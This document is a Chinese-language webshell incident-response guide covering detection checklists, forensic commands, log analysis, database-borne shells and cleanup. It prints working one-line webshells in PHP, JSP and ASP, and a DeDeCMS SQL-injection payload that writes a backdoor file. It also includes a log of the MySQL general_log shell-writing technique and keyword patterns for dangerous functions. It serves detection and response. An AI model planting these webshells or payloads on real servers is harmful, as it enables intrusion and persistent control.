# Webshell 应急响应

Webshell = 以 JSP/ASP/PHP 等网页脚本形式存在的**服务器可执行文件**，通常带文件操作和命令执行功能，本质是**网页后门**。

**主流程（《指南》6.2 常规处置五步）**：

```
① 入侵时间确定 → ② Web 日志分析 → ③ 漏洞分析 → ④ 漏洞复现 → ⑤ 漏洞修复
```

---

## 一、分类与最小样本

| 类型 | 最小形态 |
|---|---|
| **JSP** | `<%Runtime.getRuntime().exec(request.getParameter("i"));%>` |
| **ASP** | `<%eval request("cmd")%>` |
| **PHP** | `<?php $a=exec($_GET["input"]); echo $a;?>` |

**PHP 一句话马**：`<?php @eval($_POST['x']);?>`
**JSP 一句话马**：`<% if(request.getParameter("cmd")!=null){ Runtime.getRuntime().exec(request.getParameter("cmd")); } %>`

> **判据**：`eval` / `assert` / `system` / `exec` / `shell_exec` / `passthru` / `Runtime.exec` / `ProcessBuilder` + 请求参数来源 = 一句话马的典型组合。

---

## 二、Webshell 的能力（理解它能干什么，才知道要保护什么）

1. **站长工具** —— 在线编辑文件、上下传文件、数据库操作、执行命令
2. **持续远程控制** —— 攻击者植入后常**替你修补该漏洞**，防止其他攻击者再进来，实现独占控制；密码验证保证只被上传者使用
3. **权限提升** —— Webshell 权限 = Web 服务进程权限；若 Web 以 root 跑，Webshell 就是 root；否则后续靠定时任务/内核漏洞提权
4. **极强的隐蔽性** —— 可嵌套在正常网页中运行；流量走 Web 服务本身（443/80），**防火墙和流量设备很难分辨**

> ⭐ 第 2 点很重要：**发现"漏洞已被修补"不代表没被入侵**——那可能是前一个攻击者干的。

---

## 三、三种检测方法（6.1.3）

| 方法 | 要点 |
|---|---|
| **基于流量** | 流量镜像分析原始报文；对**已知和未知** Webshell 都能检测；关联 **IP/UA/Cookie**、payload、path、**时间**特征，以时间为索引还原攻击事件 |
| **基于文件** | 检测文件是否加密/混淆；**建立样本 hash 库**比对可疑文件；检查创建时间、修改时间、文件权限 |
| **基于日志** | 分析多种日志识别上传行为，回溯整个攻击过程 |

---

## 四、⭐ 排查：11 维检测清单

综合《指南》第 2 章第 4 篇、第 6 章与开源检测脚本的维度。**按维度过一遍，比手工翻文件可靠得多。**

| # | 维度 | 具体做法 / 判据 |
|---|---|---|
| 1 | **近期修改的脚本** | 最近 30 天（按事件时间窗调整）修改的 `.php/.jsp/.asp/.aspx` |
| 2 | **高危函数** | `eval` `assert` `system` `exec` `shell_exec` `passthru` `Runtime.exec` `ProcessBuilder` `call_user_func` |
| 3 | ⭐ **管理工具特征** | **菜刀 / 蚁剑 / 冰蝎 / 哥斯拉 / Weevely / C99 / R57** 的专属特征串 |
| 4 | **特征库匹配** | 需配**框架白名单**排除正常代码（否则误报极高） |
| 5 | ⭐ **图片马** | 图片文件中嵌入 PHP/JSP/ASP 代码 + **双扩展名**（`x.jpg.php`、`x.php.jpg`） |
| 6 | ⭐ **配置型后门** | `.htaccess` / `.user.ini` / `web.config` 被改（可让任意文件当脚本执行） |
| 7 | **文件熵** | **熵 > 7.0** 告警（高度随机 = 可能被加密/混淆） |
| 8 | **异常大小** | **< 50 B**（极小 loader）/ **> 500 KB**（打包型 Webshell） |
| 9 | **可疑文件名** | 纯数字、随机字符串命名 |
| 10 | ⭐ **时间戳异常** | **ctime 与 mtime 差异 > 30 天**（配合"改早于建"的逻辑错误判据） |
| 11 | **隐藏脚本** | `.` 开头的脚本文件 |

### 命令行初筛

```bash
# 按高危函数初筛（缩小范围用，误报高）
find /var/www/ -name "*.php" | xargs egrep -l \
  'eval|assert|base64_decode|system|exec|shell_exec|passthru|call_user_func'

# 近期修改的脚本
find /var/www -name "*.php" -mtime -30 -type f

# 极小 / 极大的脚本
find /var/www -name "*.php" -size -50c -o -name "*.php" -size +500k

# 隐藏脚本
find /var/www -name ".*" -type f

# 图片马：图片里找 PHP/JSP/ASP 标签
find /var/www -name "*.jpg" -o -name "*.png" -o -name "*.gif" | xargs grep -l '<?php\|<%\|eval(' 2>/dev/null

# 配置型后门
ls -la /var/www/.htaccess /var/www/.user.ini 2>/dev/null
find /var/www -name "web.config" -newer /var/www/index.php
```

### **应对免杀：文件完整性校验（正解）**

> 一个**免杀** Webshell 藏在数万行代码中，特征库扫不出来、手工也看不完。**即使 99.9% 检出率的引擎也会漏。**

**拿纯净源码与部署目录做 hash 比对**，输出**新增 / 修改 / 删除**：

```bash
# 方法一：diff 一条命令
diff -c -a -r /path/to/pristine_cms /var/www/html

# 方法二：MD5 清单比对
find /var/www/html -type f -exec md5sum {} \; | sort -k2 > deployed.md5
find /path/to/pristine    -type f -exec md5sum {} \; | sort -k2 > pristine.md5
diff pristine.md5 deployed.md5
```

真实案例输出形态：

```
可能被删除的文件有:
新增的文件有:      hackable/uploads/evil.php
可能被篡改的文件有: vulnerabilities/source/low.php
```

→ 再 diff `low.php`，发现插入了一句话 `@eval($_POST['g']);`

**方法三**：版本控制（`git diff <干净版本> HEAD`）
**方法四**：Beyond Compare / WinMerge 文件夹比较（紫色=新增，红色=被篡改）

> 如果没有纯净源码：**找研发要同版本代码**，或从同版本安装包/备份提取。

### Windows 侧

```cmd
:: D盾扫描站点目录（本工具箱已装）
bin\D盾_Web查杀\D_Safe_Manage.exe

:: 手工初筛
findstr /s /i /m "eval\|base64_decode\|assert\|Request(" C:\inetpub\wwwroot\*.asp C:\inetpub\wwwroot\*.aspx
```

---

## 五、⚠️ 内存马（无文件 Webshell）

《指南》未覆盖，但**现代比赛常见**——不落盘、特征库查不到、`find` 搜不出来。

### Java 内存马

```bash
# ① 进程与 Agent 参数
jps -lvm                          # 看 JVM 进程、-javaagent 参数
ps aux | grep -E 'java|tomcat'    # 命令行里的 javaagent/agentpath

# ② 可疑类检测：Filter / Servlet / Listener / Shell / Cmd / Memshell / Inject
#    需 dump 类加载器后筛查

# ③ ⭐ GeneratedMethodAccessor 计数（关键判据）
#    > 25000  告警
#    > 18000  可疑
#    正常业务通常远低于此

# ④ ⭐ 动态注入类：来源显示为 [?:?] 的类 = 内存马典型特征

# ⑤ 内存映射 JAR：标记 /tmp、/dev/shm 等非标准路径
cat /proc/<PID>/maps | grep '\.jar'

# ⑥ /proc/PID/fd 完整 JAR/WAR 分析
ls -l /proc/<PID>/fd | grep -E '\.jar|\.war'
```

### PHP / Python / Node 内存马与无文件持久化

```bash
# PHP：配置型注入
php -i | grep -E 'auto_prepend_file|disable_functions|open_basedir'
# auto_prepend_file 指向可疑文件 = 每次请求都加载它
cat /etc/php/*/fpm/php-fpm.conf /etc/php.ini | grep auto_prepend

# Python：模块级持久化
find / -name 'sitecustomize.py' -o -name 'usercustomize.py' -o -name '*.pth' 2>/dev/null
# .pth 文件里的一行 import 语句会在解释器启动时执行

# Node.js
env | grep -E 'NODE_OPTIONS|NODE_PATH'
# NODE_OPTIONS='--require /tmp/x.js' 可实现每次启动加载

# eBPF（Linux 内核态后门）
bpftool prog list
bpftool map list
# 可疑类型：kprobe / tracepoint / xdp
```

### Java 应用服务器目录取证（Tomcat/Jetty/WebLogic）

```bash
# 自动发现：进程命令行 + 常见路径
ps aux | grep -oE '\-Dcatalina\.[a-z]+=[^ ]+' | head

# webapps：近期 WAR/JSP、非标准命名
ls -lat $CATALINA_HOME/webapps/

# lib：近期修改的 JAR + ⭐ Agent Manifest 检测
ls -lat $CATALINA_HOME/lib/
unzip -p $CATALINA_HOME/lib/<suspect>.jar META-INF/MANIFEST.MF | grep -i agent

# conf/server.xml：Valve / Filter / Pipeline —— ⭐ 非标准 Valve 告警
grep -nE '<Valve|<Filter|className' $CATALINA_HOME/conf/server.xml

# conf/web.xml：Filter/Servlet/Listener 注册 —— ⭐ 内存马特征名直接匹配
grep -nE 'Filter|Servlet|Listener|Shell|Cmd|Memshell|Inject' $CATALINA_HOME/conf/web.xml

# bin：setenv.sh / catalina.sh 里的 javaagent 注入
grep -nE 'javaagent|agentpath|JAVA_OPTS' $CATALINA_HOME/bin/setenv.sh

# work：近期编译的 JSP 源文件 + 晚于 server.xml 的 class
ls -lat $CATALINA_HOME/work/Catalina/localhost/

# context.xml：数据库凭证泄露
grep -nE 'username|password|url' $CATALINA_HOME/conf/context.xml

# logs
tail -100 $CATALINA_HOME/logs/catalina.out
```

---

## 六、⭐ Web 日志分析（定位上传点）

### 核心思路

**从 Webshell 文件的创建时间出发，去访问日志里找同一时间窗的可疑请求。**

```bash
# 1. 拿到 Webshell 创建时间
stat /var/www/html/upload/evil.php

# 2. 在该时间窗内找请求（按日志格式调字段）
grep "10/Jun/2018:08:4" access.log

# 3. 重点看 POST 到 .php/.jsp/.aspx 的请求
grep -E 'POST .*\.(php|jsp|aspx)' access.log
```

### ⚠️ 坑位一：默认不记录 POST 请求体

> **一般应用服务器默认日志不记录 POST 请求内容。**

所以常见现象是："文件创建时间点附近**没有**可疑上传记录，但**有可疑接口访问**"——**这时要顺着接口去代码里找漏洞，别继续等上传记录。**

真实案例：发现可疑 **webservice 接口**，访问后发现变量 `buffer`、`distinctPath`、`newFileName` 可在客户端自定义 → 导致任意文件上传。

### ⚠️ 坑位二：IIS 日志时区偏移

真实案例：**IIS 日志时间与系统时间相差 8 小时**。系统时间 15:08 要查 07:08 的日志。
**不校正时区，时间线永远对不上。**

### ⚠️ 坑位三：Tomcat 日志被注释

真实案例：`server.xml` 里**日志配置项被注释**，即未启用日志 → **完全无 Web 日志 → 溯源困难**。
排查不到日志时，先检查中间件配置。日志位置见 `40-log-analysis.md`。

### ⭐ 无 IP 可用时：浏览器指纹

反代场景日志只记录代理 IP。**用 User-Agent 关联**：

```bash
grep "Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1" access.log | awk '{print $1,$4,$7}'
```

还原出攻击路径：首页 → 登录页 → `MsgSjlb.aspx`/`MsgSebd.aspx` → `Xzuser.aspx` → 多次 POST → 访问图片马。

### 攻击特征速查

| 特征 | 含义 |
|---|---|
| `POST` 到编辑器接口（如 `action=catchimage`） | 编辑器任意文件上传 |
| URL 含 `?open=1&arrs1[]=` 这类数组参数 | SQL 注入（可能落库生成马） |
| 某脚本文件**只有 1~2 次访问记录且间隔很久** | ⭐ 长期潜藏的 Webshell |
| 同一 IP 大量 404 | 目录爆破 |
| 访问路径含 `..` / `%2e%2e` | 路径穿越 |

真实案例：`image.jsp` 在一年内**只被访问过两次**（2018-04-18 和 2017-09-21）→ 推断该马在 2017-09-21 之前就已上传，**潜藏半年以上**。

---

## 七、⭐ 落库型 Webshell（数据库当跳板）

**Webshell 不一定是从文件上传漏洞来的。** 攻击者可以把"生成 Webshell 的代码"存进数据库，再触发。

### 真实攻击链（DeDeCMS）

```sql
-- 注入点：/plus/download.php?open=1&arrs1[]=99&arrs1[]=102&...
-- 注入内容写进 dede_myad / dede_mytag 表
cfg_dbprefixmyad SET normbody = '<?php file_put_contents(''read.php'',
    ''<?php eval($_POST[x]);echo mOon;?>'');?>' WHERE aid = 19 #
```

```
① 注入写入 dede_myad / dede_mytag 表（数据库里存的是 PHP 代码，不是数据）

② 访问触发点，落盘生成 webshell：
   /plus/ad_js.php?aid=19          → 生成 read.php
   /plus/mytag_js.php?aid=9013     → 生成 90sec.php
   /plus/download.php              → 该文件本身被改成马

③ 攻击者接管
```

### MySQL `general_log` 写马（另一种落库型）

真实案例完整日志：

```
202.***.***.10 - - [14/Jun/2019:09:22:37] "GET /test/l.php HTTP/1.0" 200 14820
                                    ↑ 目录猜解到探针文件
202.***.***.10 - - [14/Jun/2019:09:22:48] "POST /phpmyadmin/index.php HTTP/1.0" 302
                                    ↑ 登录 phpMyAdmin
202.***.***.10 - - [14/Jun/2019:09:23:41] "GET /phpmyadmin/server_variables.php?...varName=general_log_file...
                                    ↑ 读 general_log 路径
202.***.***.10 - - [14/Jun/2019:09:24:03] "GET /phpmyadmin/server_variables.php?...varValue=C%3A%2Fphpstudy_v8.0%2FWWW%2F520.php
                                    ↑ ⭐ 把 general_log 指向 web 目录 → 写日志即落马
202.***.***.10 - - [14/Jun/2019:09:24:33] "POST /c321.php HTTP/1.0" 200 22176
                                    ↑ 后门写后门
202.***.***.10 - - [16/Jun/2019:04:02:08] "GET /C:/phpstudy_v8.0/WWW/include/plugin/bankpay/lib/mow4125ang.php" 403
                                    ↑ ⭐ 403 反而是线索：用绝对路径访问
202.***.***.10 - - [16/Jun/2019:20:40:51] "POST /include/smarty/plugins/function.cycle.php" 200
                                    ↑ ⭐ 改模板文件生成后门，伪装成合法文件名
```

**检测信号**：

- ⭐ **`general_log_file` / `general_log` 被修改** = MySQL 写马，**不是靠上传漏洞**
- ⭐ **403 状态码也是线索**（攻击者用绝对路径访问）
- ⭐ **伪装成框架文件名**（`function.cycle.php` 看似 Smarty 插件）→ **只能靠文件完整性校验发现**

### ⭐ 清除必须连数据库一起清

真实案例给出的清除步骤：

```
1. 删除网站目录中的 webshell
2. ⭐ 清除 dede_myad、dede_mytag 数据库表中插入的 SQL 语句，
   防止再次被调用生成 webshell
```

> **只删文件不清库 = 白干**。触发点被访问一次，马就回来了。**这是落库型后门最容易丢分的地方。**

### 查数据库侧的痕迹

```sql
-- MySQL：查 webshell 的当前用户（判读入侵途径）
-- 用户是 MySQL  → 很可能通过 MySQL 漏洞打进来
-- 用户是 httpd  → 很可能通过 Web 攻击打进来

-- 是否开启日志、日志在哪
show variables like 'log_%';
show variables like 'general';
show variables like 'general_log_file';

-- 查可疑的表记录（含 PHP 代码的字段）
select * from <cms前缀>_myad where normbody like '%eval%';
select * from <cms前缀>_mytag where expbody like '%eval%';
select * from <cms前缀>_mytag where normbody like '%file_put_contents%';
```

数据库日志位置见 `40-log-analysis.md`。

---

## 八、⭐ 系统排查（Webshell 之后攻击者还会干什么）

拿到 Webshell 只是第一步，攻击者通常继续：**提权、加用户、写系统后门**实现持久化。

### 关键心态

> **不是每个 Webshell 事件都有系统级后门。**
> 真实案例结论原文：**"系统排查无异常，攻击者仅上传了 Webshell 操作。"**
>
> **查完系统面没有发现就收手换题，别在一条分支上耗死时间。**

### 检查清单（详见各专项文档）

| 面 | 查什么 | 文档 |
|---|---|---|
| 用户 | 隐藏账号 `$`、**克隆账号**、新增管理员 | `20-accounts.md` |
| 进程 | 无签名/无描述/**仿冒系统进程名**、CPU 高占用 | `25-process-service.md` |
| 服务 | 缺描述 + 非常见服务 + **binPath 用 cmd/powershell 启动** | `25-process-service.md` |
| 启动项 | Run 键、Winlogon Userinit、组策略脚本、rc*.d、systemd | `10-system-basics.md` |
| 计划任务 | 非自定义任务、**动作是 mshta/远程下载** | `10-system-basics.md` |
| 临时目录 | `temp`/`/tmp` 下的异常文件 | `30-file-artifacts.md` |
| 文件 | ⭐ **非 System32 下的 svchost.exe**、`.ssh/authorized_keys` | `30-file-artifacts.md` |
| 命令替换 | `rpm -Va`、`ls -alh /bin` 大小异常 | `30-file-artifacts.md` |
| 网络连接 | 非已知范围的 ESTABLISHED | `25-process-service.md` |

### Windows 典型痕迹

```cmd
net user                              :: 漏隐藏账号，需配合 lusrmgr.msc
netstat -ano                          :: 找非已知范围的 ESTABLISHED
sc qc <服务名>                         :: binPath 是否用 cmd/powershell
schtasks /query /fo LIST /v           :: 非自定义任务
```

真实案例中的痕迹：账户 `hacker`、`shadow$`（克隆账号）；服务 `dBFh`（无描述、`cmd` 执行 `installed.exe`）；计划任务 `Autocheck`/`Ddrivers`/`WebServers`（`cmd` 执行 `mshta` 加载远程文件）；进程 `schost.exe`（仿冒 `svchost.exe`）。

### Linux 典型痕迹

```bash
awk -F: '{if($3==0)print $1}' /etc/passwd       # 未知 UID=0 用户
ps aux                                           # CPU 高占用、随机名进程
netstat -anp                                     # 对可疑外部 IP 的连接
ls -alh /tmp                                     # .beacon 类文件
ls -al /root/.ssh/                               # 非已知公钥
crontab -l ; ls /etc/cron*                       # 每 N 分钟下载执行
cat /etc/ld.so.preload                           # 隐藏进程
unhide proc                                      # 检出被隐藏的进程
rpm -Va                                          # 系统命令被替换
```

---

## 九、网络流量排查

### 连接特征（《指南》6.4.6）

| 数据包特征 | 判定 |
|---|---|
| 含 **`z0`**、**`eval`**、**`base64_decode`** | ⭐ **中国菜刀**连接一句话木马 |
| 特殊 **`Referer`** / **`Accept-Language`** | ⭐ **Weevely** Webshell 工具 |
| 有 **PSH 标志位** | ⭐ **MSF reverse_tcp** 上线 |

```bash
tshark -r capture.pcap -Y 'http.request.method=="POST"' -T fields -e ip.src -e http.request.uri
tshark -r capture.pcap -Y 'tcp.flags.push==1' -T fields -e ip.src -e ip.dst
strings capture.pcap | grep -E 'z0|eval|base64_decode'
```

### 其他可疑行为

服务器高危行为、**Webshell 连接行为**、**数据库危险操作**、邮件违规行为、**非法外连**、异常账户登录 —— 都是溯源支撑。

---

## 十、清除加固（6.4.7 五步）

```
① 先断网，清理发现的 Webshell
② 网站被挂黑链或首页被篡改 → 删除篡改内容，同时 ⭐ 务必审计源码，
   保证源码中不存在恶意添加的内容（只删可见的会漏）
③ 系统排查后清理隐藏后门与攻击者操作内容；
   若发现 rootkit 类后门 → ⭐ 建议重装系统
④ 修补排查中发现的漏洞利用点，切断攻击路径；
   必要时做黑盒渗透测试，全面发现应用漏洞
⑤ 上述完成后，重新恢复网站运行
```

### ⭐ 紧急止血技巧（保留证据）

**禁止动态脚本在上传目录的运行权限**，使 Webshell 无法执行——**比直接删文件更稳**，同时保留证据可用于分析。

- Nginx：上传目录 `location` 里不配置 PHP handler
- Apache：上传目录 `.htaccess` 设 `php_admin_flag engine off`
- IIS：上传目录禁止执行权限

### 防御要点（6.1.4）

1. 配置防火墙并开启策略，防止暴露不必要的服务
2. 服务器加固：关远程桌面、定期改密码、**禁止用最高权限用户运行程序**、HTTPS
3. **加强对敏感目录的权限设置，限制上传目录的脚本执行权限**
4. 安装 Webshell 检测工具，发现即可疑马立即隔离查杀**并排查漏洞**
5. 排查并修补程序漏洞
6. 时常备份数据库等重要文件
7. 日常维护，**注意服务器中是否有来历不明的可执行脚本文件**
8. ⭐ **采用白名单机制上传文件**，不在白名单内的一律禁止；上传目录遵循最小权限原则

---

## 十一、常见问法与答法

| 问 | 答什么 | 依据从哪来 |
|---|---|---|
| Webshell 文件路径 | 完整路径 | D盾 / 完整性校验 / 关键字初筛 |
| 什么时候被上传的 | 文件创建时间（注意日志时区） | `stat` / `dir /tc` |
| 攻击者 IP | 该时间窗内访问该文件的源 IP | Web 日志；反代场景用浏览器指纹 |
| 利用了哪个漏洞 | 漏洞点路径 + 参数 + 类型 | 时间窗日志的可疑接口/POST |
| 攻击者怎么进来的 | 上传漏洞 / 注入落库 / 编辑器缺陷 / phpMyAdmin | 日志 + 数据库 `general_log_file` |
| 只有文件马还是也有系统后门 | 列出系统面发现项，**无则明确说"系统排查无异常"** | 系统排查清单 |
| 怎么清除 | **删文件 + 清数据库记录 + 修漏洞 + 查系统** | 第十节五步 |
| 有几个 Webshell | 全部列出，别只报一个 | 全盘扫描 |

---

## 相关文档

- `../20-accounts.md` — 克隆/隐藏账号
- `../25-process-service.md` — 进程服务排查
- `../30-file-artifacts.md` — 完整性校验、时间戳判据、SUID
- `../40-log-analysis.md` — Web 日志位置与统计命令
- `../60-tools.md` — D盾等工具落点
- `web-defacement.md` — 网页篡改与暗链
- `../casebook.md` — 3 个完整案例（含跨主机跳板）
